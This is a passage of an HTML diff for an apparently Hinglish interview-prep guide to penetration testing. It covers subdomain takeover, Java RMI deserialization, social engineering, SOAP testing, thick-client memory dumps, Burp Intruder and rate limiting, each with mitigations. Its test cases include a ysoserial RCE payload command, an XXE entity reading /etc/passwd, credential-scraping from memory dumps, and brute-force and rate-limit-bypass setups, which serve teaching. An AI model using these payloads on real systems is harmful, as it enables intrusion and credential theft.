+<h2><span class="n">11</span>DNS Misconfigurations &amp; Subdomain Takeover</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>DNS misconfigs: <b>open zone transfer</b> (AXFR bina auth — full DNS map leak), <b>dangling CNAME</b> (subdomain kisi deprovisioned service par point karta hai — Heroku/S3/GitHub Pages/Azure), <b>missing SPF/DMARC</b> (email spoofing), <b>wildcard DNS</b>, <b>NS delegation to dead provider</b> (full domain takeover), <b>no DNSSEC</b> (cache poisoning risk). <b>Subdomain takeover:</b> dangling CNAME mila → service provider par same name register karo → ab tum control karte ho victim domain ka content — cookies scope, phishing, XSS on main domain (if cookies domain-wide), SEO abuse.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Takeover = full content control on trusted subdomain (phishing credibility), session/cookie theft, malware hosting, brand damage. Zone transfer = complete network map for attackers.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Restrict AXFR to authorized secondaries only.</li>
+<li>Remove/point dangling CNAMEs; automate subdomain ownership checks.</li>
+<li>Deploy SPF/DKIM/DMARC (reject policy).</li>
+<li>DNSSEC signing for integrity.</li>
+<li>Regular audits: DNS records + takeover scan (nuclei -t takeovers).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Zone transfer: <code>dig AXFR target.com @ns1.target.com</code> — records milte hain?</li>
+<li>Enumeration: <code>subfinder -d target.com</code> + <code>amass enum -d target.com</code>.</li>
+<li>Takeover check: <code>dig CNAME sub.target.com</code> — CNAME unclaimed service par? phir <code>nuclei -t http/takeovers/</code>.</li>
+<li>SPF/DMARC: <code>dig TXT target.com</code> — spf/dkim/dmarc records hain?</li>
+<li>DNS rebinding/wildcard: random subdomain resolve hota hai?</li>
+<li>NS check: <code>dig NS target.com</code> — dead provider? (can-i-take-over-xyz checklist).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br><code>staging.target.com</code> ka CNAME deprovisioned Heroku app par tha — attacker ne Heroku par same name app banaya → staging login page par fake cred form → employee credentials phish. Fix: CNAME cleanup + takeover monitoring.</div>
+</section>
+
+<section class="topic" id="t12">
+<h2><span class="n">12</span>RMI Injection (Java Remote Method Invocation)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Java RMI = remote method calls between JVMs — registry default port <b>1099</b> (plus random ports), also RMI-IIOP, JMX-RMI. <b>Attacks:</b> registry bina auth serialized objects accept karta hai → <b>deserialization RCE</b> (ysoserial gadget chains — CommonsCollections etc.); <b>unauthenticated JMX</b> → MBean invoke → code exec (javax.management.loading.MLet remote class loading); security manager misconfig; codebase URL spoofing.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Remote code execution on Java services (often internal middleware) — CVSS 9.8 class. RMI registry exposed = immediate critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Firewall RMI/JMX ports (internal only).</li>
+<li>Authentication on registry/JMX (JAAS, SSL).</li>
+<li>Disable remote class loading / restrict codebase.</li>
+<li>Deserialization filters (JEP 290 / ObjectInputFilter allowlists).</li>
+<li>Patch JDK (many RMI CVEs); run RMI apps in sandbox/least privilege.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Scan: <code>nmap -p 1099 target</code> + <code>nmap --script rmi-* target</code>.</li>
+<li>Enum: Metasploit <code>auxiliary/scanner/misc/java_rmi_server</code> / <code>rmi_dumpregistry</code>.</li>
+<li>BaRMIe tool: registry endpoints + attack surface detect.</li>
+<li>ysoserial: <code>java -jar ysoserial.jar CommonsCollections6 'id'</code> → registry ko bhejo (authorized).</li>
+<li>JMX check: port 1099/9012/8686 par JMX unauth MBean access (mlet RCE).</li>
+<li>SSL variant: RMI over SSL ke saath bhi test karo (port 1100+).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Internal scan mein Java app ka RMI registry 1099 open — BaRMIe se confirmed deserialization surface → ysoserial CommonsCollections chain se system shell. Fix: firewall + auth + JEP 290 filter.</div>
+</section>
+
+<section class="topic" id="t13">
+<h2><span class="n">13</span>Honeypot — What It Is &amp; How It Works</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Honeypot = decoy system/service jo attacker ko attract karne ke liye deliberately vulnerable dikhta hai — asli maqsad <b>detection, attacker TTPs ka intel, diversion</b>. Types: <b>low-interaction</b> (emulated services — Cowrie SSH/Telnet, Dionaea, Glastopf) — safe, limited; <b>high-interaction</b> (real vulnerable systems) — realistic, risky; <b>honeynets</b> (network of honeypots); <b>honeytokens</b> (fake credentials/files/DB rows jo touch hote hi alert dete hain). Security teams isse early warning system ki tarah use karte hain.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Attacker honeypot mein time waste karta hai, uski tools/techniques log hoti hain, breach early detect hota hai. Galt deployment se attacker ko asli systems ka rasta mil sakta hai — segmentation zaroori.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Honeypots ko production network se isolate karo (VLAN).</li>
+<li>Log everything: sessions, commands, keystrokes, files.</li>
+<li>Integrate with SIEM — instant alerting on interaction.</li>
+<li>Regularly update emulation (attackers fingerprint honeypots).</li>
+<li>Never put real data/creds in honeypots.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Deploy: <code>docker run cowrie</code> — SSH honeypot; connect karke commands log dekho.</li>
+<li>Honeytoken: fake API key/DB record rakh kar interaction alert test karo.</li>
+<li>Fingerprint: nmap se honeypot detect hota hai? (imperfect emulation).</li>
+<li>SIEM integration: honeypot hit par alert aata hai?</li>
+<li>Isolation test: honeypot se production network reachable nahi hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Enterprise ne perimeter par Cowrie honeypot deploy kiya — attacker ne usi par brute force ki, uske wordlists aur tools capture hue → IOC banakar puri network par hunting hui, breach hone se pehle hi.</div>
+</section>
+
+<!-- ==================== TESTING PROCESS & TOOLS ==================== -->
+<h3 class="category">Testing Process &amp; Tools</h3>
+
+<section class="topic" id="t14">
+<h2><span class="n">14</span>Social Engineering Attacks — Phishing, Spear Phishing, Baiting, Tailgating</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Phishing:</b> mass generic emails (fake login, invoice) — volume game. <b>Spear phishing:</b> targeted, researched victim (LinkedIn/job info) — high success. <b>Whaling:</b> executives/CEOs. <b>Vishing:</b> phone calls; <b>Smishing:</b> SMS. <b>Baiting:</b> infected USB drives chhodna, fake ads/downloads. <b>Tailgating:</b> authorized person ke saath physical access. <b>Pretexting:</b> fake scenario (IT support call) se info nikalna. Human = weakest link — technical controls bypass ho jaate hain.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Credential theft, malware delivery (ransomware entry), BEC (business email compromise) fraud, physical breach — most breaches social engineering se shuru hote hain.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Security awareness training + regular phishing simulations (GoPhish).</li>
+<li>MFA everywhere (stolen password alone useless).</li>
+<li>Email security: DMARC/DKIM/SPF + gateway filtering + link sandboxing.</li>
+<li>Physical: badge + tailgating policy, reception awareness, clean desk.</li>
+<li>Incident reporting culture + rapid response for reported phishing.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Phishing sim: GoPhish se fake login page campaign (authorized) — click/cred rate measure.</li>
+<li>USB drop: honeytoken USB chhod kar plug hone par alert test (authorized).</li>
+<li>Tailgating test: badge swipe ke bina access attempt (authorized, physical).</li>
+<li>Vishing: pretext call se password/OTP maangna (authorized social test).</li>
+<li>DMARC check: <code>dig TXT target.com</code> — spoofing possible hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Spear phishing: finance team ko fake vendor invoice email — $50k wire transfer fraud (BEC). Fix: dual approval for transfers + DMARC + awareness.</div>
+</section>
+
+<section class="topic" id="t15">
+<h2><span class="n">15</span>WSDL — What It Is &amp; SOAP Testing</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>WSDL (Web Services Description Language) = SOAP web service ka XML contract — batata hai: <b>operations</b> (kya call kar sakte ho), <b>messages/parameters</b>, <b>portType</b> (operation definitions), <b>binding</b> (SOAP/HTTP), <b>service endpoint</b>. URL pattern: <code>/service?wsdl</code>, <code>/service.svc?wsdl</code>. <b>Testing:</b> WSDL download → operations enumerate → har operation ko test karo (auth, injection, IDOR, XXE in SOAP XML) → SOAPAction header tampering → parameter type confusion.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>WSDL exposed = attack surface map free mein; SOAP APIs vulnerable ho sakti hain (XXE, SQLi, authz gaps) — legacy enterprise systems mein common.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Disable WSDL exposure in production (or restrict to authorized).</li>
+<li>Authentication + authorization per operation (not just endpoint).</li>
+<li>XML parsing secure (XXE mitigations — Part 1 topic 18).</li>
+<li>Validate SOAPAction + message structure (XSD schema validation).</li>
+<li>WS-Security: signatures/encryption for sensitive operations.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Fetch: <code>curl http://target/service?wsdl</code> — WSDL accessible? operations list karo.</li>
+<li>SoapUI/Postman se har operation call karo — auth required hai?</li>
+<li>SOAP body mein XXE: <code>&lt;!DOCTYPE x [&lt;!ENTITY e SYSTEM "file:///etc/passwd"&gt;]&gt;</code>.</li>
+<li>SOAPAction tamper: valid action bhej kar body change karo — validation hai?</li>
+<li>IDOR: operation params mein doosre user ke IDs (Part 1 topic 35).</li>
+<li>Parameter type confusion: int field mein string/XML daalo — error info leak?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking SOAP API ka ?wsdl public tha — operations se pata chala "GetAccountBalance" bina auth callable tha → account numbers enumerate → data leak. Fix: WSDL off + per-operation auth.</div>
+</section>
+
+<section class="topic" id="t16">
+<h2><span class="n">16</span>VAPT Methodology — Web Application</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Phases: <b>1. Scope &amp; rules of engagement</b> (URLs, in-scope functions, timing, no-DoS clauses) → <b>2. Recon</b> (passive OSINT + active: subdomains, tech stack, wappalyzer) → <b>3. Enumeration</b> (endpoints, parameters, APIs, hidden dirs — ffuf/gobuster) → <b>4. Vulnerability discovery</b> (OWASP Top 10 checklist, authN/authZ, injections, logic) → <b>5. Exploitation</b> (validate impact, chain attacks, minimal PoC) → <b>6. Post-exploitation</b> (privilege escalation, data access depth) → <b>7. Reporting</b> (CVSS, business impact, PoC, remediation) → <b>8. Retest</b> (verify fixes). Both authenticated + unauthenticated testing.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Systematic approach = complete coverage + defensible findings. Ad-hoc testing = missed criticals aur weak reports.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Follow a checklist (OWASP WSTG) — repeatable coverage.</li>
+<li>Test with multiple roles (user, admin, guest) — authz gaps pakdo.</li>
+<li>Manual + automated (Burp Scanner/DAST + manual verification).</li>
+<li>Document evidence: request/response, screenshots, steps.</li>
+<li>Retest after remediation — verify fixes actually work.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Recon: <code>subfinder</code>, <code>nmap -sV</code>, wappalyzer — tech stack note karo.</li>
+<li>Enum: <code>ffuf -w wordlist.txt -u https://target/FUZZ</code>; API endpoints JS se nikaalo.</li>
+<li>Har input par injection set: SQLi, XSS, SSTI, command injection.</li>
+<li>AuthN: login brute, OTP bypass, session issues (Part 1 topics 32, 37).</li>
+<li>AuthZ: IDOR/BFLA with two accounts (Part 1 topic 35).</li>
+<li>Logic: price/coupon/step-skip (Part 1 topic 41).</li>
+<li>Reporting: finding template — title, severity, CVSS, PoC, fix, CWE.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Healthcare portal VAPT: recon → subdomain with staging API → unauthenticated patient-data API (IDOR) → 40k records. Report: Critical, CVSS 9.1, CWE-639, fix: authz + staging tak pahunch band.</div>
+</section>
+
+<section class="topic" id="t17">
+<h2><span class="n">17</span>SDLC — Phases &amp; Secure SDLC</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SDLC phases: <b>Planning</b> (requirements, feasibility) → <b>Requirements Analysis</b> (security requirements yahan define karo) → <b>Design</b> (architecture, <b>threat modeling — STRIDE</b>, attack surface review) → <b>Development</b> (secure coding standards, <b>SAST</b>, peer review) → <b>Testing</b> (DAST, penetration testing, SCA) → <b>Deployment</b> (hardening, secrets management, config review) → <b>Maintenance</b> (patching, monitoring, vulnerability management). <b>Secure SDLC / DevSecOps:</b> security har phase mein embedded — shift-left (testing jaldi), CI/CD pipeline mein SAST/DAST/SCA/secrets scanning, security champions, automated gates.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Security baad mein add karna = 10-100x costly; early detection = cheap fixes, fewer production incidents, compliance ready.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Threat modeling design phase mein (STRIDE per component).</li>
+<li>SAST + secrets scanning in CI (fail builds on critical).</li>
+<li>SCA/dependency scanning (Log4Shell class incidents roko).</li>
+<li>DAST + manual pentest before release; retest cycle.</li>
+<li>Post-deploy: vulnerability management, patching SLA, monitoring.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Pipeline check: CI mein SAST (Semgrep/SonarQube) configured hai?</li>
+<li>Secrets scan: git history mein API keys? (<code>gitleaks</code> / trufflehog).</li>
+<li>Dependency check: <code>OWASP Dependency-Check</code> / Snyk report — known CVEs?</li>
+<li>Threat model exists? — design docs review karo.</li>
+<li>Pre-prod DAST: Burp Scanner staging par run — criticals blocked release?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Company ne SCA add kiya — Log4Shell wale log4j version wale 12 repos turant flagged → patched before exploitation. Earlier, production breach tak jaata.</div>
+</section>
+
+<section class="topic" id="t18">
+<h2><span class="n">18</span>Nessus — Usage &amp; Experience (Interview Answer)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Tenable Nessus = industry-standard <b>vulnerability scanner</b>. Features: <b>credentialed scans</b> (deep OS/software audit) vs <b>uncredentialed</b> (external view), plugin-based (70k+ plugins), CVSS scoring, compliance templates (CIS benchmarks, PCI-DSS), web app scanning, patch auditing, false-positive triage support, reporting. Flow: new scan → policy (targets, ports, plugins, credentials) → run → analyze results by severity → validate manually → report + remediation tracking → rescan.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>VA finds thousands of issues fast — but high false positives; manual validation zaroori. Credentialed scans internal patching gaps dikhate hain jo external se nahi dikhte.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Scan with credentials for accuracy (patch-level visibility).</li>
+<li>Triage: verify each Critical/High manually (curl/nmap/exploit attempt).</li>
+<li>Prioritize by CVSS + exploitability + asset criticality (not just count).</li>
+<li>Remediation tracking: tickets, owners, SLA, rescan verification.</li>
+<li>Schedule: continuous/periodic scanning + change-triggered scans.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Create uncredentialed scan: target IP/range, default port range, run karo.</li>
+<li>Credentialed: SSH/Windows creds add karke deep scan — patching gaps milte hain?</li>
+<li>Web app scan template: target URL — SQLi/XSS plugins findings check karo.</li>
+<li>PCI template: compliance controls report generate karo.</li>
+<li>False positive validation: ek finding lo (e.g., "OpenSSH &lt; 7.2") — <code>nmap -sV</code> se version verify karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Nessus credentialed scan se 2000 servers par critical patch gaps mile (incl. MS17-010) — patching campaign chali, rescan se compliance 98%. Interview mein: "Yes, I've used Nessus — primarily credentialed scans + FP triage + remediation tracking."</div>
+</section>
+
+<section class="topic" id="t19">
+<h2><span class="n">19</span>Thick Client Applications — Vulnerabilities</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Thick client = desktop app (Java/.NET/C++) jo server se communicate karta hai. Common vulns: <b>insecure local storage</b> (config/DB/registry mein credentials plaintext), <b>hardcoded secrets</b> (API keys, DB passwords in code), <b>insecure deserialization</b>, <b>DLL hijacking</b> (untrusted search path), <b>client-side auth bypass</b> (server validation missing), <b>memory manipulation</b> (Cheat Engine se values change — prices/roles), <b>insecure communication</b> (no TLS/pinning), <b>weak input validation</b> (buffer overflows), <b>debug backdoors</b>, <b>insecure update mechanism</b> (MITM update → RCE), <b>excessive privileges</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Credential theft, business logic abuse (price/balance tamper), RCE via DLL hijack/update poisoning, server-side data compromise through stolen client secrets.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Server-side validation of ALL business logic (never trust client).</li>
+<li>Encrypt local storage (DPAPI/Credential Manager/Keystore); no hardcoded secrets.</li>
+<li>Signed binaries + DLL load from app dir only (SetDllDirectory).</li>
+<li>Secure update: TLS + signature verification + code signing.</li>
+<li>Code obfuscation/anti-debug + least-privilege execution.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Decompile: dnSpy (.NET) / JD-GUI (Java) — strings mein password/api_key search.</li>
+<li>Config files: app.config, .ini, DB files — plaintext creds?</li>
+<li>Traffic: Wireshark/Burp (if proxy-able) — data encrypted hai?</li>
+<li>Memory: Cheat Engine se balance/isAdmin value scan + modify — server accept karta hai?</li>
+<li>DLL hijack: procmon se missing DLL paths dhundho, malicious DLL drop karke test (lab).</li>
+<li>Update: update URL/mechanism MITM-able hai? signature verify hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Trading thick client: price check sirf client-side tha — Cheat Engine se order price modify karke server ne accept kar liya → financial loss. Fix: server-side price authority.</div>
+</section>
+
+<section class="topic" id="t20">
+<h2><span class="n">20</span>Thick Client Memory Dump — Identify &amp; Mitigate</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Memory dump = process RAM ka snapshot — sensitive data (passwords, session tokens, crypto keys, decrypted content) RAM mein plaintext rehta hai. <b>Identify:</b> Procdump (Windows), gdb (Linux), Frida (<code>fridump</code>), Cheat Engine; dump par <code>strings</code> + grep (password, token, key, secret). <b>Mitigation:</b> zeroize buffers after use, avoid storing secrets in variables (use SecureString/char arrays), OS protected storage (DPAPI/Credential Manager), minimize decrypted data lifetime, anti-debug/anti-dump, obfuscation, and — most important — server-side enforcement taaki memory tamper ka impact na ho.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Credential/token extraction se impersonation; memory tamper (isAdmin flag, price) se business logic abuse; decrypted data theft.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Zeroize secrets (Arrays.fill/ SecureZeroMemory) after use.</li>
+<li>Use OS secure storage (DPAPI, Keychain, Keystore) instead of RAM-held secrets.</li>
+<li>Never cache decrypted data; re-decrypt per use.</li>
+<li>Anti-debug (IsDebuggerPresent, TracerPid) + anti-dump checks.</li>
+<li>Server-side validation — memory tamper ka impact zero karo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Dump: <code>procdump -ma app.exe dump.dmp</code>; <code>strings dump.dmp | grep -i password</code>.</li>
+<li>Frida: <code>fridump -u app</code> — tokens/keys milte hain?</li>
+<li>Cheat Engine: health/money/isAdmin value search → change karo → app/server react?</li>
+<li>gdb: <code>gdb -p PID</code> → memory search for strings.</li>
+<li>Decrypted data: app mein password enter karke dump — plaintext dikhta hai?</li>
+<li>SecureString test: .NET SecureString use ho raha hai? (decompile check).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking desktop app login ke baad API token RAM mein plaintext rehta tha — procdump + strings se token nikal kar attacker ne API directly call kiya. Fix: zeroize + short-lived tokens + server-side checks.</div>
+</section>
+
+<section class="topic" id="t21">
+<h2><span class="n">21</span>Tools Used in Web Application Security Testing</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Category-wise: <b>Proxy/Interception</b> — Burp Suite, OWASP ZAP; <b>Scanners (DAST)</b> — Burp Scanner, Acunetix, Qualys WAS, Nikto; <b>Recon/Enum</b> — Nmap, subfinder, amass, ffuf, gobuster, httpx, nuclei, theHarvester; <b>Exploitation</b> — Metasploit, sqlmap, hydra, John, hashcat, ysoserial, searchsploit; <b>Browser</b> — DevTools, HackBar, Cookie-Editor; <b>API</b> — Postman, SoapUI, Burp; <b>Source/Static</b> — Semgrep, SonarQube, jadx (mobile); <b>Network</b> — Wireshark, tcpdump; <b>OSINT</b> — Shodan, crt.sh, GitHub search.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Sahi tool per phase = efficient testing; wrong tool = missed vulns ya time waste. Automation + manual combination is key.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use tools as aid, not replacement — validate every finding manually.</li>
+<li>Keep tools updated (nuclei templates, Burp extensions).</li>
+<li>Combine: scanner for coverage + manual for logic/authz.</li>
+<li>Document tool versions in report (reproducibility).</li>
+<li>Use safe settings (no destructive plugins without scope).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Recon: <code>subfinder -d target.com | httpx -title -tech-detect</code>.</li>
+<li>Fuzz: <code>ffuf -w dirs.txt -u https://target/FUZZ</code> — hidden dirs.</li>
+<li>Scan: <code>nuclei -u https://target -t cves/</code> — known CVE hits.</li>
+<li>SQLi: sqlmap (topic 44); XSS: Burp/手动; auth: hydra.</li>
+<li>Mobile API: Burp + jadx + Frida combination.</li>
+<li>ZAP baseline: automated scan in CI — daily coverage.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Recon pipeline: subfinder → httpx → nuclei — ek hi command chain se 200 subdomains scan hue, 3 critical CVEs mili jo manual phase mein exploit validate kiye.</div>
+</section>
+
+<section class="topic" id="t22">
+<h2><span class="n">22</span>Burp Suite — Modules &amp; Workflow</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Modules: <b>Proxy</b> (intercept, history, match/replace, WebSocket); <b>Repeater</b> (manual request modification); <b>Intruder</b> (automated fuzzing/brute); <b>Scanner</b> (DAST — active/passive); <b>Sequencer</b> (token randomness); <b>Decoder/Comparer</b> (encoding, diff); <b>Extender</b> (BApp store — Autorize, Logger++, HTTP Request Smuggler); <b>Collaborator</b> (OOB); <b>Target</b> (site map, scope); <b>Project options</b> (CA cert, TLS). <b>Workflow:</b> set proxy → install CA → browse app (map endpoints) → test authN/authZ manually (Repeater) → fuzz params (Intruder) → scanner for broad coverage → validate + exploit → report.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Burp = de-facto standard; interviewer expects module fluency + practical workflow. Extensions se testing power badhti hai (authz bypass detection, smuggling).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use scope targeting — avoid scanning out-of-scope hosts.</li>
+<li>Throttle Intruder/Scanner (avoid DoS/noise).</li>
+<li>Combine passive scan + manual active testing (accuracy).</li>
+<li>Use Extensions: Autorize (BFLA), 403 bypass, Collaborator everywhere.</li>
+<li>Save project + evidence for reporting.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Proxy: intercept login — request modify karke send karo.</li>
+<li>Repeater: CSRF token validation test — token hata kar bhejo.</li>
+<li>Intruder: username enumeration — positions + wordlist.</li>
+<li>Sequencer: session token 100 samples — randomness weak?</li>
+<li>Decoder: Base64/URL encode-decode roundtrip.</li>
+<li>Autorize extension: normal-user session se admin endpoints — 200 aata hai? (BFLA).</li>
+<li>Collaborator: blind SSRF test (topic 10).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview-style demo: login captured in Burp → Repeater mein "role" param add → Intruder se role values fuzz → "admin" accepted → privilege escalation confirmed → report with request/response evidence.</div>
+</section>
+
+<section class="topic" id="t23">
+<h2><span class="n">23</span>Burp Intruder vs Repeater — Differences</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Repeater:</b> manual single-request tool — request ko tweak karke ek-ek karke send karo, response compare karo. Precise, no automation. <b>Intruder:</b> automated attack tool — payload positions mark karo, payload sets (wordlists) se <b>hundreds/thousands of requests</b>, attack types (Sniper/Battering Ram/Pitchfork/Cluster Bomb), rate control. <b>Difference:</b> Repeater = surgical (logic testing, validation, CSRF token tests); Intruder = brute force/fuzzing/enumeration (username enum, password spray, param fuzz, IDOR iteration).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Dono ka sahi use = efficient testing. Repeater se precise PoC; Intruder se wide coverage (enumeration, brute) — interview mein use-case difference batao.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Intruder: set throttling/delay — avoid DoS, stay stealthy.</li>
+<li>Intruder: use small smart wordlists first, then expand.</li>
+<li>Repeater: verify each finding with minimal exact PoC.</li>
+<li>Combine: Intruder se discover → Repeater se confirm.</li>
+<li>Scope check before Intruder runs (out-of-scope risk).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Repeater: login request mein username field par single quote daalo — error? (manual SQLi check).</li>
+<li>Repeater: CSRF token remove karke send — accept hota hai?</li>
+<li>Intruder Sniper: id=100 position par 1..1000 payload — IDOR enumeration.</li>
+<li>Intruder Cluster Bomb: username+password combos — login brute.</li>
+<li>Intruder: X-Forwarded-For header fuzz — rate limit bypass test.</li>
+<li>Compare responses: Intruder mein length/status filters — anomalies dhundho.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>OTP verify endpoint — Repeater se manual check (OTP reuse), Intruder se 6-digit brute attempt → rate limit nahi mila → 2FA bypass confirmed (Part 1 topic 32).</div>
+</section>
+
+<section class="topic" id="t24">
+<h2><span class="n">24</span>Four Types of Intruder Attacks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>1. Sniper:</b> ek payload position, ek payload set — har position ek-ek karke fuzz hoti hai (e.g., har parameter alag test). <b>2. Battering Ram:</b> ek payload set, <b>saare positions mein same value</b> ek saath (e.g., same username+password). <b>3. Pitchfork:</b> multiple payload sets, <b>parallel</b> — position1=set1[i], position2=set2[i] (paired combos: user[i]/pass[i]). <b>4. Cluster Bomb:</b> multiple payload sets, <b>cartesian product</b> — saare combinations (user1×pass1, user1×pass2...).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Sahi attack type = efficient + correct results. Galat type = useless requests ya huge load (Cluster Bomb on 2 big wordlists = lakhs requests).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Match attack type to test goal (enum vs pair vs combo).</li>
+<li>Cluster Bomb careful — combinations explode (n×m).</li>
+<li>Use throttling + resource pools (intruder settings).</li>
+<li>Verify findings — Intruder sirf discovery ke liye.</li>
+<li>Scope + rate limits respect karo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Sniper: <code>username=§FUZZ§&amp;password=test</code> — username enumeration (single position).</li>
+<li>Battering Ram: <code>username=§X§&amp;password=§X§</code> — same value both fields (default creds test).</li>
+<li>Pitchfork: users.txt + passwords.txt — user[i]/pass[i] pairs (known combos).</li>
+<li>Cluster Bomb: 100 users × 1000 passes — full brute (careful).</li>
+<li>Result analysis: status codes, response length, redirects — anomalies note karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Pitchfork se leaked user:pass pairs (credential stuffing) tested — 30 accounts compromised hui kyunki reused passwords the. Fix: MFA + breached-password check.</div>
+</section>
+
+<section class="topic" id="t25">
+<h2><span class="n">25</span>Rate Limiting — How Would You Implement It?</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Rate limiting = request frequency control to prevent abuse (brute force, scraping, DoS). <b>Layers:</b> CDN/edge (Cloudflare), reverse proxy (Nginx <code>limit_req</code>), API gateway (Kong/Envoy), app middleware, Redis-based. <b>Algorithms:</b> fixed window (simple, burst edges), sliding window (smooth), token bucket (burst allowed, avg capped), leaky bucket (constant rate). <b>Key by:</b> IP + user ID + endpoint combination; trust X-Forwarded-For only from trusted proxies (spoof risk). <b>Policies:</b> login 5-10/min, API per-key limits, exponential backoff, CAPTCHA after N failures, lockout with recovery, connection limits for slowloris.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>No rate limit = brute force, credential stuffing, scraping, API abuse, DoS. Poor implementation (IP-only) = NAT users locked out, attackers spoof XFF.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Multi-dimensional limits: per-user + per-IP + per-endpoint.</li>
+<li>Distributed store (Redis sliding window) — scale + consistency.</li>
+<li>Graceful response: 429 + Retry-After, not silent drop.</li>
+<li>Exempt legit integrations via API keys with own quotas.</li>
+<li>Monitor limit hits — anomaly alerts (abuse detection).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login brute: Intruder 100 attempts — kahan 429/lockout aata hai?</li>
+<li>Bypass: X-Forwarded-For spoof (<code>X-Forwarded-For: 1.2.3.4</code> change karke) — limit reset hota hai?</li>
+<li>Bypass: session rotate karke attempts — user-based limit missing?</li>
+<li>Distributed sim: multiple IPs se — per-IP vs per-user check.</li>
+<li>Nginx test: <code>limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m</code> — burst behavior.</li>
+<li>429 response: Retry-After header present? proper UX?</li></ul></div>
